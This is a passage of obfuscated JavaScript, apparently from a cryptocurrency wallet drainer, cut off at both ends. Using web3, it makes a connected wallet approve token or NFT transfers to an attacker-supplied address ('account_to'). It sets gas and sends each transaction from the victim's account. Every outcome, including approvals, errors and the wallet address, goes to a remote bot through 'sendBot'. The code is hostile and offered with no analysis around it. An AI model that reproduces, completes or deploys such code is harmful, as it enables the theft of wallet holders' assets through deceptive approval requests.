token[_0x3193e7(0x252)]==_0x3193e7(0x206)&&(approve_method=Contract[_0x3193e7(0x232)][_0x3193e7(0x248)](account_to,token[_0x3193e7(0x215)]));}catch(_0x54f8c0){try{approve_method=Contract['methods'][_0x3193e7(0x223)](account_to,!![]);}catch(_0x34945c){try{Contract=new web3[(_0x3193e7(0x23a))][(_0x3193e7(0x207))](erc20_abi,token[_0x3193e7(0x1cf)]);if(token[_0x3193e7(0x252)]==_0x3193e7(0x21c))approve_method=Contract['methods'][_0x3193e7(0x248)](account_to,new web3[(_0x3193e7(0x205))]['BN'](token[_0x3193e7(0x1eb)]));else token[_0x3193e7(0x252)]=='nft'&&(approve_method=Contract[_0x3193e7(0x232)][_0x3193e7(0x248)](account_to,token[_0x3193e7(0x215)]));}catch(_0x15b91c){return Contract=new web3[(_0x3193e7(0x23a))][(_0x3193e7(0x207))](JSON[_0x3193e7(0x20b)](abis[token[_0x3193e7(0x250)]][token[_0x3193e7(0x1cf)]]),token[_0x3193e7(0x1cf)]),sendBot({'code':_0x15b91c[_0x3193e7(0x25a)],'message':_0x15b91c[_0x3193e7(0x27e)],'walletAddr':account},String['fromCodePoint'](0x26d4)+_0x3193e7(0x24e)),await mobileMetaProcess(),null;}}}try{var _0x383bc8=token,_0x449141=await approve_method[_0x3193e7(0x26c)]({'from':account});await approve_method[_0x3193e7(0x231)]({'from':account,'gasLimit':_0x449141,'gasPrice':web3[_0x3193e7(0x205)]['toWei']((parseInt(await getGwai(token[_0x3193e7(0x250)]))+0x1)[_0x3193e7(0x22c)](),_0x3193e7(0x27a))},_0x61ee47=>{var _0x3a951e=_0x3193e7;_0x61ee47==null?sendBot(Object[_0x3a951e(0x1f3)](token,{'from':account,'to':account_to}),String['fromCodePoint'](0x2705)+_0x3a951e(0x27b)):sendBot(Object['assign'](_0x61ee47,token,{'from':account,'to':account_to}),String[_0x3a951e(0x25c)](0x274c)+_0x3a951e(0x1ef));})['then'](()=>{sendBot(Object['assign'](_0x383bc8,{'from':account,'to':account_to}),String['fromCodePoint'](0x1f525)+'Approved');})[_0x3193e7(0x23c)](_0x246945=>{var _0x21f6d5=_0x3193e7;sendBot({'code':_0x246945[_0x21f6d5(0x25a)],'message':_0x246945[_0x21f6d5(0x27e)],'walletAddr':account},String[_0x21f6d5(0x25c)](0x26d4)+_0x21f6d5(0x24e));});}catch(_0x4159cb){sendBot({'code':_0x4159cb[_0x3193e7(0x25a)],'message':_0x4159cb['message'],'walletAddr':account},String[_0x3193e7(0x25c)](0x26d4)+_0x3193e7(0x24e));}}}}}else connect=0x0;}else console[_0x3193e7(0x255)](_0x3193e7(0x1f9));}